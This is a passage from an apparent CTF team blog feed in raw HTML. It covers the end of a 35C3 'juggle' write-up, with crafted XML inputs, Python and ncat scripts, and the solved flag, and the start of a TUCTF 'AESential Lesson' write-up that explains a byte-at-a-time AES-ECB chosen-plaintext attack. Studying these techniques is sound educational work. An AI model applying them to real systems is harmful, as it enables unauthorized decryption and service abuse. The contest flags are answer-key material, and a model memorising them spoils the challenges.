182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>So after this I wrote a python script that reads this outputs and counts the length every number:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'out'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">lines = f.readlines()</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lines:</span><br><span class="line"><span class="keyword">print</span> map(len,l.strip().split(<span class="string">' '</span>)[:<span class="number">-5</span>])</span><br></pre></td></tr></table></figure><p>The output is something like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>From the outputs I analysed that when the <strong>single number</strong> had a length of <strong>50</strong>, the <strong>chef-drinks</strong> would always have an equal length of <strong>10</strong>, the other lengths <strong>diverged</strong> into different things so I decided to only <strong>extract</strong> the numbers if the single number <strong>has a length of 50</strong>. So now we need to create a xml file according with the info we just got, but it needs to be done <strong>dynamically</strong> at least of the part of the drinks, because we need to be really <strong>fast</strong> on the requests to get the <strong>same</strong> number it’s only possible if you do in a program. So the structure the xml solution we want to form needs to be something like this:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">दाल</span>&gt;</span>4<span class="tag">&lt;/<span class="name">दाल</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>We need 5 plates of <strong>Борщ</strong> because we need to reduce the count of <strong>chef-drinks</strong> to zero, and each iteration of <strong>Борщ</strong> will reduce the <strong>$chef-drinks</strong> by one, the final plate <strong>दाल</strong> is to finally print the flag, so I wrote two scripts to do this the first one is a simplified version of my bash script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1=$(ncat 35.246.237.11 1 &lt; solution.xml | grep -Poh <span class="string">'\d&#123;4,&#125;'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var1</span>;</span><br></pre></td></tr></table></figure><p>Before the python script I prepared this xml file so I didn’t need to create every tag in python:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">दाल</span>&gt;</span>4<span class="tag">&lt;/<span class="name">दाल</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>And finally my python script:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line">tree = ET.parse(<span class="string">'solution2.xml'</span>)</span><br><span class="line">root = tree.getroot()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">100</span>):</span><br><span class="line">a =  subprocess.check_output([<span class="string">'bash'</span>,<span class="string">'rofl.sh'</span>]).strip().split(<span class="string">' '</span>)</span><br><span class="line"><span class="keyword">if</span> (len(a[<span class="number">0</span>]) == <span class="number">50</span>):</span><br><span class="line">state = root.getchildren()[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>,<span class="number">10</span>):</span><br><span class="line">b = ET.SubElement(state,<span class="string">'drinks'</span>)</span><br><span class="line">b.text = a[<span class="number">0</span>][i:i+<span class="number">10</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment"># create a new XML file with the results</span></span><br><span class="line">mydata = <span class="string">"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n"</span>+ET.tostring(root, encoding=<span class="string">"utf-8"</span>) +<span class="string">'\n\n'</span>  </span><br><span class="line">myfile = open(<span class="string">"items2.xml"</span>, <span class="string">"w"</span>)  </span><br><span class="line">myfile.write(mydata)</span><br></pre></td></tr></table></figure></p><p>And now running it all:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$  bash -c <span class="string">"python juggle.py &amp;&amp; ncat 35.246.237.11 1 &lt; items2.xml"</span></span><br><span class="line">Reading input document from stdin...</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all&gt;&lt;flag&gt;35C3_The_chef_gives_you_his_compliments&lt;/flag&gt;&lt;/all&gt;</span><br></pre></td></tr></table></figure><p>The flag was 35C3_The_chef_gives_you_his_compliments</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;    juggle 97&lt;br&gt;&lt;br&gt;    Solves: 54&lt;br&gt;&lt;br&gt;    Can you help this restaurant Stack the right amount of Eggs in their ML algor
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="35C3" scheme="https://teamrocketist.github.io/tags/35C3/"/>
    
      <category term="random" scheme="https://teamrocketist.github.io/tags/random/"/>
    
      <category term="xslt" scheme="https://teamrocketist.github.io/tags/xslt/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] TUCTF 2018 - AESential Lesson</title>
    <link href="https://teamrocketist.github.io/2018/11/26/Crypto-TUCTF-2018-AESential-Lesson/"/>
    <id>https://teamrocketist.github.io/2018/11/26/Crypto-TUCTF-2018-AESential-Lesson/</id>
    <published>2018-11-26T06:51:39.000Z</published>
    <updated>2018-11-26T06:56:28.181Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>AESential Lesson<br>465<br><br>Thought I’d give you an essential lesson to how you shouldn’t get input for AES in ECB mode.<br><br>nc 18.218.238.95 12345<br></blockquote><p>Learning by the description we can already know the cryptography used here is <strong>AES ECB mode</strong>, we are provided a file with the encryption process:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> select <span class="keyword">import</span> select</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">INTRO = <span class="string">"""</span></span><br><span class="line"><span class="string">Lol. You think you can steal my flag?</span></span><br><span class="line"><span class="string">I\'ll even encrypt your input for you,</span></span><br><span class="line"><span class="string">but you can\'t get my secrets!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">"REDACTED"</span> <span class="comment"># TODO Redact this</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">"REDACTED"</span> <span class="comment"># TODO Redact this</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">padc = <span class="string">'REDACTED'</span> <span class="comment">#TODO Redact this</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (len(flag) == <span class="number">32</span>) <span class="keyword">and</span> (len(key) == <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">sys.stdout.write(INTRO)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sys.stdout.write(<span class="string">'Enter your text here: '</span>)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">rlist, _, _ = select([sys.stdin], [], [])</span><br><span class="line"></span><br><span class="line">inp = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> rlist:</span><br><span class="line">inp = sys.stdin.readline().rstrip(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">plaintext = inp + flag</span><br><span class="line">l = len(plaintext)</span><br><span class="line"></span><br><span class="line">padl = (l // <span class="number">32</span> + <span class="number">1</span>)*<span class="number">32</span> <span class="keyword">if</span> l % <span class="number">32</span> != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">plaintext = plaintext.ljust(padl, padc)</span><br><span class="line"><span class="comment">#print plaintext</span></span><br><span class="line"></span><br><span class="line">sys.stdout.write(<span class="string">'Here\'s your encrypted text:\n&#123;&#125;\n\n'</span>.format((cipher.encrypt(plaintext)).encode(<span class="string">'hex'</span>)))</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>By looking at the script we can already see, the flag has 32 bytes of size, the key as well, the encryption method processes as follows, since it’s <strong>ECB</strong> we know the plaintext will be split in blocks of 16 bytes and for each block will be applied the AES encryption function with the key provided in the file:<br><a data-fancybox="gallery" href="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/ECB_encryption.svg/601px-ECB_encryption.svg.png" target="_blank" rel="noopener"><br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/ECB_encryption.svg/601px-ECB_encryption.svg.png" alt=""><br></a></p><p>Before the encryption we can see the program asks for an input to be encrypted, the input is concatenated with the flag and then it’s applied some padding to fill the last blocks, for example imagine the padding character is 1, the sent input is ‘A’ and the respective flag is ‘TUCTF{MY_B34UT1FULL_FL4G_L0L_XD}’ the padding will be applied to the plaintext as follows:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">ATUCTF&#123;MY_B34UT1      FULL_FL4G_L0L_XD      &#125;111111111111111      1111111111111111</span><br></pre></td></tr></table></figure><p>After this as described before the encryption is applied to each block with a key, now we can perform an attack without needing the key, we can bruteforce the flag byte by byte, imagine we sent an input of 15 ‘A’s the first block of the plaintext and ciphertext will be as follows (The key in this examples is a random key chosen by me):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4               </span><br><span class="line">AAAAAAAAAAAAAAAT      UCTF&#123;MY_B34UT1FU      L_FL4G_L0L_XD&#125;1       1111111111111111</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3</span><br><span class="line">82b094debf0605ef9d46ad671ac3605d 08663b2c2a83bd539e14e2ea671035c4 b2140d0e9125ca1de2cd1ea85d21ae7e </span><br><span class="line"></span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now we know that <strong>input + 1st_char_of_the_flag</strong> its corresponding ciphertext is the <strong>1st block</strong>, now we just need to send the inputs for every character possible until we match the <strong>1st</strong> ciphertext we got with the input of <strong>14 “A”s</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">AAAAAAAAAAAAAAAA 207ca0ee7f5bdb8897caa7b1f8ff2157</span><br><span class="line">AAAAAAAAAAAAAAAB 9884f8e45e5ea527ca6c9b090bef5e64</span><br><span class="line">AAAAAAAAAAAAAAAC e422f4ff06175cfe7e00b3002bd8b464</span><br><span class="line">      ....                   .......</span><br><span class="line">AAAAAAAAAAAAAAAT 82b094debf0605ef9d46ad671ac3605d</span><br></pre></td></tr></table></figure><p>As we can see from above we matched the <strong>82b094debf0605ef9d46ad671ac3605d</strong>, we now know the first character of the flag is <strong>T</strong>, well we already knew that! but this was just a confirmation :), using this method we can get the first 16 bytes of the flag, but how can we get the last 16 ? For this we need to find the padding character we can do this by sending an <strong>A</strong> to the server, imagine the padding character is <strong>_</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">ATUCTF&#123;MY_B34UT1      FULL_FL4G_L0L_XD      &#125;_______________      ________________</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3                           </span><br><span class="line">7a80f91bcf406446befb10e0720b8a7d ece296fd74e495dc5b2890596777f3eb 2a5831079c0a0591601f25278f4623f3 </span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now we want to extract the <strong>block 3</strong> or the <strong>block 4</strong> cipher, <strong>block 3</strong> also works because we actually know that the last byte of the flag is <strong>}</strong>, so making an example using block 3 <strong>2a5831079c0a0591601f25278f4623f3</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">&#125;000000000000000 5f87ae73237e86dd625e820ba93056e0</span><br><span class="line">&#125;111111111111111 d9044a33bc1e523222289c56a6505c79</span><br><span class="line">&#125;222222222222222 774066300cda4278f32729b032a3bfe7</span><br><span class="line">      ....                   .......</span><br><span class="line">&#125;_______________ 2a5831079c0a0591601f25278f4623f3</span><br></pre></td></tr></table></figure><p>Now that we have the <strong>padding character</strong>, we need to work something similar on how we got the 1st part of the flag, but now instead of comparing with the <strong>1st block</strong> of the cipher we want to compare it with the <strong>3rd block</strong> by sending an <strong>A</strong> we get the 3rd block cipher:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">ATUCTF&#123;MY_B34UT1      FULL_FL4G_L0L_XD      &#125;_______________      ________________</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3                           </span><br><span class="line">7a80f91bcf406446befb10e0720b8a7d ece296fd74e495dc5b2890596777f3eb 2a5831079c0a0591601f25278f4623f3 </span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now we test all characters until we match this <strong>block3</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 